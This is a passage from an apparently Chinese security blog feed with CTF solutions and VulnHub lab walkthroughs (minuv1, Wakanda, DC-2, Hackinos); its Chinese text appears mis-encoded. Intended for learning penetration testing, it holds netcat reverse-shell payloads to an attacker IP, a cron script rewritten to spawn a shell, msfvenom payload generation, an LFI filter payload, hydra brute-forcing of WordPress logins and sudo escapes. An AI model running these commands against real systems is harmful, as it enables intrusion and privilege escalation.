<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if=1 bs=1 skip=364 of=1.1</span><br><span class="line">#ddå‘½ä»¤ç”¨äºè¯»å–ã€è½¬æ¢ã€è¾“å‡ºæ•°æ®</span><br><span class="line">cat *.1 &gt; fly.rar</span><br><span class="line">#å°†è¿™äº›æ–‡ä»¶ç¢ç‰‡éƒ½æ‹¼æˆåŸå§‹çš„å‹ç¼©æ–‡ä»¶</span><br><span class="line">md5sum fly.rar | grep e023afa4f6579db5becda8fe7861c2d3</span><br><span class="line">#æ£€æŸ¥MD5ç æ˜¯å¦åŒ¹é…</span><br></pre></td></tr></table></figure>
<p>ç„¶åç”¨blessæ‰“å¼€raræ–‡ä»¶ï¼Œæ£€æŸ¥åŠ å¯†ä½ï¼Œå‘ç°æ˜¯ä¼ªåŠ å¯†ï¼Œå› ä¸ºç¬¬ä¸€è¡Œçš„73åé¢çš„æ ‡è®°ä½æ˜¯0000ï¼Œå¦‚æœåŠ å¯†å°±æ˜¯8000<br>
raræ–‡ä»¶å¤´æ ¼å¼ä»‹ç»ï¼š<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html</a></p>
<p>æŠŠç¬¬äºŒè¡Œ74åé¢çš„84æ”¹æˆ80å°±å¯ä»¥äº†ï¼Œå› ä¸ºçœ‹è®ºæ–‡å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚çš„å€¼ç±»ä¼¼äºlinuxä¸­chmodçš„1ã€2ã€4ä»£è¡¨ä¸‰ç§æƒé™ï¼Œ<br>
æœ€ç»ˆå°†æ‰€éœ€æƒé™çš„å€¼ç›¸åŠ åœ¨ä¸€èµ·å¾—åˆ°æœ€ç»ˆçš„æ ‡å¿—ä½å†…å®¹</p>
<p>æ”¹å®Œä¹‹åï¼Œè§£å‹ï¼Œæ‰“å¼€ï¼Œå‘ç°ä¹±ç ï¼Œæ”¹åç¼€ä¸ºexeï¼Œæ‰§è¡Œï¼Œå‘ç°ä¸€å¤§å †è‹è‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk flag.txt</span><br><span class="line">#å‘ç°å¾ˆå¤špngå›¾ç‰‡ï¼Œå°è¯•ä½¿ç”¨foremostå·¥å…·è¿›è¡Œæ–‡ä»¶ä¿®å¤</span><br><span class="line">foremost -v -i flag.txt -o outputfile</span><br><span class="line">#-v å°†æ‰€æœ‰ä¿¡æ¯è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œ-iè¡¨ç¤ºè¾“å…¥æ–‡ä»¶,-oè¡¨ç¤ºè¾“å‡ºç›®æ ‡</span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€åæœ‰äºŒç»´ç ï¼Œé‡Œå¤´æœ‰flag</p>
<h3 id="æ—¥å¿—å®¡è®¡">æ—¥å¿—å®¡è®¡</h3>
<p>sqlmapäºŒåˆ†æœç´¢</p>
<p>è§‚å¯Ÿä¸‹é¢è¿™ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.17.0.1 - - [03/Nov/2018:02:50:57 +0000] &quot;GET /vulnerabilities/sqli_blind/?id=2&apos; AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),24,1))&gt;124 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765 &quot;http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
<p>ç‰¹å¾æœ‰200å“åº”æˆåŠŸï¼Œè€Œä¸”å¯¹äºæ¯ä¸€ä½æ¥è¯´ï¼Œæœ€åä¸€æ¬¡å¾—åˆ°200å“åº”åŒ¹é…çš„asciiç åŠ ä¸Šä¸€å°±æ˜¯çœŸå®çš„asciiç ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">import</span> urllib</span><br><span class="line"><span class="number">2</span> <span class="keyword">import</span> re</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span> ffile=open(<span class="string">'/home/access.log'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="number">5</span> datas=ffile.readlines()</span><br><span class="line"><span class="number">6</span> avalid=[]</span><br><span class="line"><span class="number">7</span> <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line"><span class="number">8</span>     tmp=urllib.unquote(data)</span><br><span class="line"><span class="number">9</span>     <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'COUNT'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'200'</span> <span class="keyword">in</span> tmp:</span><br><span class="line"><span class="number">10</span>         avalid.append(tmp)</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> flag_ascii=&#123;&#125;</span><br><span class="line"><span class="number">13</span> <span class="keyword">for</span> segment <span class="keyword">in</span> avalid:</span><br><span class="line"><span class="number">14</span>     checkout=re.search(<span class="string">r'LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND'</span>,segment)</span><br><span class="line">      <span class="comment">#è¿™é‡Œ(.*?)åé¢è¦åŠ ANDå¦åˆ™å¤§äºå·ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«åŒ…æ‹¬è¿›(.*?)ä¸­å»äº†</span></span><br><span class="line"><span class="number">15</span>     <span class="keyword">if</span> checkout:</span><br><span class="line"><span class="number">16</span>         key=int(checkout.group(<span class="number">1</span>))</span><br><span class="line"><span class="number">17</span>         <span class="keyword">print</span> key</span><br><span class="line"><span class="number">18</span>         <span class="keyword">print</span> checkout.group(<span class="number">2</span>)</span><br><span class="line"><span class="number">19</span>         <span class="keyword">print</span> int(checkout.group(<span class="number">2</span>))</span><br><span class="line"><span class="number">20</span>         value=int(checkout.group(<span class="number">2</span>))+<span class="number">1</span></span><br><span class="line"><span class="number">21</span>         flag_ascii[key]=value  <span class="comment">#åŒä¸€ä¸ªkeyï¼Œvalueåœ¨å˜åŒ–ç›´åˆ°æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="number">23</span> flag=<span class="string">''</span></span><br><span class="line">   <span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">           flag+=chr(value)</span><br><span class="line">   <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h3 id="weblogic">weblogic</h3>
<p>è¯´æ˜¯è¦æ‰¾åˆ°è¢«æ”»å‡»ä¸»æœºçš„åå­—ã€‚è¿‡æ»¤æ¡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;hostname&quot;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰¾ä¸€æ‰¾å°±è¡Œäº†ã€‚ã€‚ã€‚</p>
<h3 id="ä¿¡æ¯æå–">ä¿¡æ¯æå–</h3>
<p>è¿™é“é¢˜çœŸçš„å¾ˆæ‡µåœˆã€‚<br>
å°†wiresharkä¸­æ¶‰åŠåˆ°ç›²æ³¨çš„æ•°æ®åŒ…éƒ½å¯¼å‡ºåˆ°txtæ–‡ä»¶ä¸­æ¥ã€‚<br>
ç„¶åpythonè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'/root/kkk.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">lines=f.readlines()</span><br><span class="line">datas=[]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">  tmp=urllib.unquote(line)</span><br><span class="line">  datas.append(tmp)</span><br><span class="line"></span><br><span class="line">flag_ascii=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">  checkout=re.search(<span class="string">r'LIMIT 0,1),(.*?),1\)\)&gt;(.*?) HTTP'</span>,data)</span><br><span class="line">  <span class="keyword">if</span> checkout:</span><br><span class="line">    key=int(checkout.group(<span class="number">1</span>))</span><br><span class="line">    value=int(checkout.group(<span class="number">2</span>))</span><br><span class="line">    flag_ascii[key]=value</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">  flag+=chr(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆflagä¸­æœ‰çš„å­—ç¬¦æ˜¯å¯¹çš„æœ‰çš„æ˜¯é”™çš„ã€‚</p>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>minuv1é¶æœºæ¸—é€è®°å½•(å­˜ç–‘)</title>
    <url>/2019/04/22/minuv1%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>åœ¨è¿™æ¬¡é¶æœºæ¸—é€è¿‡ç¨‹ä¸­æœ‰å¾ˆå¤šå­˜ç–‘çš„åœ°æ–¹ï¼Œç‰¹åˆ«æ˜¯<code>tty</code>çš„è·å¾—é‚£ä¸€å—ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šä¸åŒçš„è§£æ³•ï¼Œä½†æ˜¯å…¶åŸç†è¿˜éœ€ç»†ç»†æ¢ç´¢ã€‚</p>
<p>é¦–å…ˆä½¿ç”¨<code>netdiscover</code>å‘ç°é¶æœºï¼Œ<code>nmap</code>æ‰«æç«¯å£ï¼Œè®¿é—®æ— ç‰¹åˆ«ä¿¡æ¯ã€‚</p>
<p>ä½¿ç”¨githubä¸Šçš„<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>æ¥æ‰«æç›®å½•ï¼ˆæˆ‘ç”¨kaliè‡ªå¸¦çš„dirbæ²¡æœ‰æ‰«åˆ°ï¼‰ï¼Œå‘ç°<code>text.php</code>ã€‚</p>
<p>è®¿é—®å¹¶ç‚¹å‡»é“¾æ¥ï¼Œå…³æ³¨<code>urlï¼šhttp://192.168.43.83/test.php?file=last.html</code>ã€‚</p>
<ul>
<li>çŒœæµ‹1ï¼šæ­£å¸¸çš„æ–‡ä»¶è®¿é—®
<ul>
<li>fileå‚æ•°æ”¹æˆ/etc/passwdï¼Œè®¿é—®å¤±è´¥</li>
</ul>
</li>
<li>çŒœæµ‹2ï¼šå‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡catä¹‹ç±»çš„å‘½ä»¤æ¥è®¿é—®ï¼Œå‘½ä»¤ä¹‹é—´ç”¨åˆ†å·åˆ†éš”
<ul>
<li>fileå‚æ•°ä¸ºfile=last.html;whoamiè®¿é—®å¤±è´¥</li>
<li>fileå‚æ•°ä¸ºfile=last.html;idè®¿é—®æˆåŠŸ<br>
ä½†æ˜¯åœ¨å°è¯•åå¼¹<code>shellï¼ˆncã€/bin/ncã€netcatã€/bin/netcatï¼‰</code>çš„æ—¶å€™å¤±è´¥äº†ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">ç»•è¿‡å®‰å…¨ç­–ç•¥çš„ç½‘ç«™</a>ï¼Œæ”¶é›†äº†æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ã€‚</li>
</ul>
</li>
</ul>
<p>äºæ˜¯<code>file=a;busybox nc 192.169.43.211 4444 -e /bin/sh -i</code>ï¼ŒåŒæ—¶æ”»å‡»æœºä¸Šè¿è¡Œ<code>nc -lvp 4444</code></p>
<p>ç„¶åæ‹¿åˆ°äº†shell,è¿›å…¥<code>/home/bob</code>ç›®å½•å‘ç°<code>._pw_</code>æ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€ä¸²<code>jwt</code><a href="https://www.vaadata.com/blog/jwt-tokens-and-security-working-principles-and-use-cases/" target="_blank" rel="noopener">josn web<br>
tocken</a>,ç„¶ågithubä¸Šæœ‰ä¸€ä¸ªè„šæœ¬æ¥ç ´è§£å…¶ä¸­çš„secret-keyï¼š<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">å·¥å…·é“¾æ¥</a>,è·‘å®Œåå¾—åˆ°<code>secretkey</code>ã€‚</p>
<hr>
<p>ä»è¿™é‡Œå¼€å§‹æ¶‰åŠçŸ¥è¯†ç›²åŒºäº†ï¼Œå°è¯•ç”¨<code>secretkey</code>å»ç™»é™†<code>bob</code>å’Œ<code>root</code>ï¼ˆè¿™ä¸ªæœ‰ç‚¹è„‘æ´ï¼‰ã€‚ä½†æ˜¯è¿™ä¸æ˜¯<code>tty shell</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ‰§è¡Œsuå‘½ä»¤ï¼Œå› ä¸ºä¼šè®©ä½ è¾“å…¥å¯†ç ã€‚</p>
<p>è€ƒè™‘åˆ°æƒé™çš„é—®é¢˜ï¼Œå°†ç›®å½•åˆ‡æ¢åˆ°<code>/tmp</code>ä¸‹ï¼Œåœ¨è¿™é‡Œæ‰€æœ‰ç”¨æˆ·éƒ½æœ‰å®Œæ•´çš„è¯»å†™æƒé™ã€‚ç„¶åæ‰§è¡Œ<code>script -c &quot;/bin/bash&quot;</code>,è¿™æ ·å°±æ¥åˆ°äº†<code>bash</code>ç¯å¢ƒä¸­ï¼Œç„¶åç”¨<code>su</code>å‘½ä»¤ï¼Œèƒ½æˆåŠŸç™»é™†rootç”¨æˆ·ï¼ŒææƒæˆåŠŸã€‚</p>
<p><img src="http://ww1.sinaimg.cn/large/0062HBMaly1g13iqh4iexj30p30fmmz0.jpg" alt></p>
<p>ä½†æ˜¯å…³äºttyshellçš„çŸ¥è¯†è¿˜æ˜¯æ¯”è¾ƒæ¨¡ç³Šï¼Œéœ€è¦å†æ‰¾æ‰¾èµ„æ–™ã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939" target="_blank" rel="noopener">https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939</a></p>
<p><a href="https://0x10f8.wordpress.com/2018/09/15/vulnhub-minuv1-ctf/" target="_blank" rel="noopener">https://0x10f8.wordpress.com/2018/09/15/vulnhub-minuv1-ctf/</a></p>
]]></content>
      <categories>
        <category>é¶æœºæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>Wakandaé¶æœºæ¸—é€</title>
    <url>/2019/04/22/Wakanda%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>é¦–å…ˆå‘ç°ä¸»æœºï¼š<code>netdiscover</code>æˆ–è€…<code>arp-scan -l</code>ï¼Œå‘ç°é¶æœº</p>
<p>ç„¶å<code>nmap -sS -p- (victim_url)</code>ï¼Œå¼€æ”¾çš„ç«¯å£æœ‰80ï¼Œ111ï¼Œ3333.<br>
è®¿é—®ä»¥ä¸‹80ç«¯å£ï¼Œæºç ä¸­æœ‰ä¸€è¡Œæ³¨é‡Šï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--herf=&quot;?lang=fr&quot;--&gt;</span><br></pre></td></tr></table></figure>
<p>å°è¯•ç»™è®¿é—®<code>url/?lang=fr</code>ï¼Œå‘ç°é¡µé¢çš„è¯­è¨€å˜æˆäº†æ³•è¯­ã€‚è€ƒè™‘æ–‡ä»¶åŒ…å«ï¼Œè®¿é—®<code>url/?lang=php://filter/read=convert.base64-encode/resource=index</code>(indexå’Œindex.phpéƒ½è¦è¯•ä¸€ä¸‹)ã€‚<br>
è§£ç ä¹‹åå¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå¯†ç ï¼Œç„¶ååœ¨ä¹‹å‰çš„ç½‘é¡µä¸­ï¼Œå¯ä»¥çœ‹è§æœ€ä¸‹æ–¹æœ‰ä¸€ä¸ªç”¨æˆ·åï¼Œå°è¯•ç”¨è¿™ä¸ªç”¨æˆ·åå’Œå¯†ç å»sshç™»é™†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh mamadou@(url) -p 3333</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¾“å…¥å¯†ç å°±å¯ä»¥è¿æ¥è¿›å…¥é¶æœºäº†ã€‚è¿›å…¥ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªpythonçš„äº¤äº’ç•Œé¢ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è°ƒç”¨<code>pty</code>åº“æ¥è¿›å…¥äº¤äº’å¼çš„<code>shell</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawm(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å­æˆ‘ä»¬å°±æ¥åˆ°äº†bashï¼Œå¹¶æ‹¿åˆ°äº†ç¬¬ä¸€ä¸ªflagï¼Œå°è¯•ä½¿ç”¨å‘½ä»¤<code>sudo -l</code>æ¥æŸ¥çœ‹å½“å‰ç”¨æˆ·<code>æ‰€èƒ½æ‰§è¡Œçš„rootç”¨æˆ·å‘½ä»¤</code>ï¼Œç»“æœå¹¶æ²¡æœ‰å¯æ‰§è¡Œçš„rootå‘½ä»¤ã€‚æŸ¥çœ‹æœ‰æ²¡æœ‰å…¶ä»–ç”¨æˆ·(å¯ä»¥é€šè¿‡æŸ¥çœ‹<code>/etc/passwd</code>æˆ–è€…<code>/home</code>ç›®å½•ä¸‹çš„ç”¨æˆ·å¾—çŸ¥ç”¨æˆ·ä¿¡æ¯)ã€‚å‘ç°æœ‰ä¸€ä¸ªå«åš<code>devops</code>çš„ç”¨æˆ·ï¼Œé€šè¿‡<code>find / -user devops 2&gt;/dev/null</code>æ¥å‘ç°<code>devops</code>çš„æ–‡ä»¶ï¼Œå‘ç°ç¬¬äºŒä¸ªflagï¼ŒåŒæ—¶è¿˜æœ‰ä¸€ä¸ª<code>.antivirus.py</code>æ–‡ä»¶ã€‚</p>
<p>è¿›å…¥å‘ç°æºä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°†é‚£ä¸ªtestæ–‡ä»¶åˆ æ‰ä¹‹åè¿‡ä¸€æ®µæ—¶é—´åˆä¼šå‡ºç°ï¼Œç„¶åç»“åˆpyçš„æ–‡ä»¶åï¼Œå¯ä»¥æ¨æµ‹è¿™ä¸ªè„šæœ¬ä¼šéš”ä¸€æ®µæ—¶é—´æ‰§è¡Œä¸€æ¬¡ã€‚<br>
é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥åå¼¹shellã€‚æ”¹å†™æ”¹pyæ–‡ä»¶å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"nc (my_host) -p 4444 -e '/bin/bash' -i"</span>)</span><br></pre></td></tr></table></figure>
<p>ç„¶åå…¶ä»–çš„writeupä¸­æ˜¯è¿™æ ·åˆ©ç”¨çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=4444 R</span><br></pre></td></tr></table></figure>
<p>ç„¶åæŠŠç”Ÿæˆçš„<code>poc</code>å†™è¿›pyæ–‡ä»¶ä¸­æ¥ã€‚<br>
ç„¶ååœ¨è‡ªå·±çš„æ”»å‡»æœºä¸Šå¼€å¯nc,<code>nc -lvp 4444</code>ç”±äºpyæ–‡ä»¶æ‰§è¡Œçš„æ—¶å€™ï¼Œæ‰§è¡Œçš„èº«ä»½æ˜¯<code>devops</code>æ‰€ä»¥æˆ‘ä»¬å¾—åˆ°çš„æ˜¯devopsçš„shellï¼Œå¯ä»¥æŸ¥çœ‹ç¬¬äºŒä¸ªflagçš„å†…å®¹äº†ã€‚</p>
<p>ç„¶å<code>sudo -l</code>æŸ¥çœ‹è¯¥ç”¨æˆ·å¯ç”¨çš„ç®¡ç†å‘˜å‘½ä»¤ï¼Œå‘ç°ä¸€ä¸ª<code>pip</code>å¯ä»¥æ‰§è¡Œï¼Œç„¶åæœ‰ä¸€ä¸ª<code>Fakepip</code>çš„è„šæœ¬å¯ä»¥åˆ©ç”¨ï¼Œåœ¨æ”»å‡»æœºä¸ŠæŠŠè„šæœ¬ç»™ä¸‹è½½è¿‡æ¥ï¼Œç„¶ååœ¨è„šæœ¬ç›®å½•ä¸‹è¿è¡Œ<code>sudo python -m SimpleHttpServer 80</code>æ¥è¿è¡Œç®€å•çš„<code>python http</code>æœåŠ¡ï¼Œç„¶ååœ¨é¶æœºä¸Šè¿è¡Œ<code>wget http://(attacker url)/setup.py</code>æ¥æŠŠFakepipä¸­çš„setupè„šæœ¬ä¼ è¾“è¿‡å»ã€‚è®°å¾—åœ¨ä¼ è¾“ä¹‹å‰ä¿®æ”¹setupè„šæœ¬ä¸­çš„lhostå’Œlportï¼Œ<a href="http://xn--setup-4n1h846arhg5r4bh4ut71dw3sgxw.py" target="_blank" rel="noopener">ç„¶ååœ¨é¶æœºä¸­è¿è¡Œsetup.py</a>ï¼ŒåŒæ—¶åœ¨æ”»å‡»æœºä¸Šé¢è¿è¡Œ<code>nc -lvp 4444</code>æ¥å—shellï¼Œç„¶åå°±å¾—åˆ°äº†rootæƒé™</p>
]]></content>
      <categories>
        <category>é¶æœºæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>Vulhub-DC-2</title>
    <url>/2019/05/23/Vulhub-DC-2/</url>
    <content><![CDATA[<h2 id="DC-2-é¶æœºæ¸—é€">DC-2 é¶æœºæ¸—é€</h2>
<p>å¤ç°ä¸ä¸‹å»äº†æ¥æ‰“æ‰“é¶æœºï¼Œå˜¤å˜¤å˜¤~~~</p>
<p>é¦–å…ˆ<code>arp-scan -l</code> å’Œ<code>nmap -A -p- 172.28.15.94</code> å¼€è·¯ï¼Œå‚æ•°A <code>Enable OS detection, version detection, script scanning, and traceroute</code> ã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58260318-d00cfa80-7da8-11e9-8af5-c5fc585b160e.png" alt="image"></p>
<p>ç„¶åè®¿é—®<code>http://dc-2</code> è®¿é—®ä¸äº†ï¼Œäºæ˜¯åœ¨<code>/etc/hosts</code> ä¸­æ·»åŠ <code> dc-2	172.28.15.94</code> ï¼Œç„¶åå°±å¯ä»¥è®¿é—®äº†ã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58260265-bb306700-7da8-11e9-8270-83388ac493a0.png" alt="image"></p>
<p>çœ‹åˆ°äº†ç¬¬ä¸€ä¸ª<code>flag</code> ï¼Œæç¤ºè¯´è®©ä½¿ç”¨å·¥å…·<code>cewl</code> è¿™æ˜¯ä¸€ä¸ªé€šè¿‡çˆ¬å–ç½‘é¡µå†…å®¹æ¥ç”Ÿæˆpasswordçš„å·¥å…·ã€‚</p>
<p><code>cewl -w dc2_passwords.txt http://dc-2</code></p>
<p>ç»è¿‡<code>wpscan</code> æ‰«æä¹‹åå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªç”¨æˆ·å<code>jerry</code> <code>admin</code> <code>tom</code> ï¼Œå°è¯•ä½¿ç”¨<code>hydra</code> æ¥çˆ†ç ´ã€‚</p>
<p><code>hydra -L dc-2_user.txt -P dc2_password.txt dc-2 http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</code></p>
<p>å­—ç¬¦ä¸²é‡Œçš„ä¸œè¥¿ä»¥<code>:</code>ä¸ºåˆ†éš”ç¬¦åˆ†æˆå‡ ä¸ª<code>hydra</code> çš„å‚æ•°ï¼Œè¢«<code>^</code> åŒ…è£¹çš„æ˜¯ä¼ å‚ä½ç½®æ ‡å¿—ï¼ŒSè¡¨ç¤ºå¸Œæœ›æˆåŠŸã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58261191-6ee62680-7daa-11e9-8751-388384b1be62.png" alt="image"></p>
<p>å‘ç°äº†ä¸¤ä¸ªç”¨æˆ·åçš„å¯†ç ï¼Œç„¶ååœ¨<code>/wp-login.php</code>ä¸‹ç™»å½•<code>jerry</code> å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªflagã€‚</p>
<p>å°è¯•<code>ssh jerry@dc-2 -p</code> å¤±è´¥ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>tom</code> è¿›è¡Œç™»å½•ï¼Œè¿›å»ä¹‹åä½¿ç”¨<code>cd</code> å’Œ<code>ls</code> å°±ä¼šå¼¹å‡º<code>rbash</code> çš„æç¤ºã€‚ä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>vi</code>å‘½ä»¤ï¼Œè¿›å…¥<code>vim</code> ä¹‹åä»¥ä»–ä¸ºåª’ä»‹æ‰§è¡Œå‘½ä»¤<code>set shell=/bin/sh</code>ä»¥åŠ<code>shell</code> ï¼Œå°±å¯ä»¥æ¥åˆ°<code>sh</code> ç¯å¢ƒä¸‹ï¼Œé…ç½®ç¯å¢ƒå˜é‡<code>export PATH=/usr/sbin/:/usr/bin:/sbin:/bin</code> ä¹‹åå°±å¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤äº†ï¼Œå¯ä»¥è·å¾—<code>flag3</code> äº†ã€‚</p>
<p>æœ€åå°±æ˜¯ææƒäº†ã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58263410-81625f00-7dae-11e9-9664-e58db889bbe1.png" alt="image"></p>
<p>æ ¹æ®æç¤º <code>sudo -l</code>åˆ—å‡ºå¯ä»¥æ‰§è¡Œçš„<code>sudo </code>å‘½ä»¤ï¼Œä½†æ˜¯å¤±è´¥äº†ã€‚ã€‚ã€‚å°è¯•ç™»é™†<code>jerry</code> è´¦å·æˆåŠŸå¹¶ä¸”æ‹¿åˆ°äº†<code>flag4.txt</code> æ ¹æ®æ–‡ä»¶ä¸­æœ€åçš„æç¤ºï¼Œæ‰§è¡Œä¸€ä¸‹<code>sudo -l</code> ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œ<code>git</code>å‘½ä»¤ï¼Œä½¿ç”¨<code>sudo git help status</code> ï¼Œå¹¶åœ¨é‡Œé¢æ‰§è¡Œ<code>!/bin/bash</code> ï¼Œè¿™æ ·å°±å¯ä»¥ä»¥<code>root</code>çš„æƒé™æ¥åˆ°bashäº†ï¼ŒææƒæˆåŠŸã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58263823-56c4d600-7daf-11e9-9b25-bb2b26e63a8a.png" alt="image"></p>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>Hackinos Penetration</title>
    <url>/2019/05/03/Hackinos-Penetration/</url>
    <content><![CDATA[<h2 id="hackinos-from-vulhub">hackinos from vulhub</h2>
<p>this time , I tried to follow chailaoâ€™s steps to break the target-shooting machine and of course, learned a lot ğŸ˜ƒ</p>
<p>first, use <code>sudo netdiscover</code> or <code>sudo arp-scan -l</code> to discover the machine.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022143-d7852c00-6c60-11e9-8f8a-ccb35b4f5a6e.png" alt="Screenshot from 2019-05-01 22-25-32"></p>
<p>then , use <code>nmap -sV -p- {ip}</code> to verify the ports open to us.</p>
<blockquote>
<p>-sV: Probe open ports to determine service/version info</p>
</blockquote>
<p>and here we got:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022147-d94eef80-6c60-11e9-8ec0-0e8dadc0db10.png" alt="Screenshot from 2019-05-01 22-26-05"></p>
<p>next , check the web site and discover that it was made by <code>wordpress</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022161-dfdd6700-6c60-11e9-9128-b8a4a54ce9d3.png" alt="Screenshot from 2019-05-01 22-27-21"><br>
and try to implement a scan to it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022150-dbb14980-6c60-11e9-8e51-5145b102b578.png" alt="Screenshot from 2019-05-01 22-28-33"></p>
<p>here we find <code>robot.txt</code>, which contains something as follows:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022155-dce27680-6c60-11e9-9347-f4fc67860a6c.png" alt="Screenshot from 2019-05-01 22-30-17"></p>
<p>so, get to upload.php and check the source codeâ€¦there is a link where you can find the source code of php page.</p>
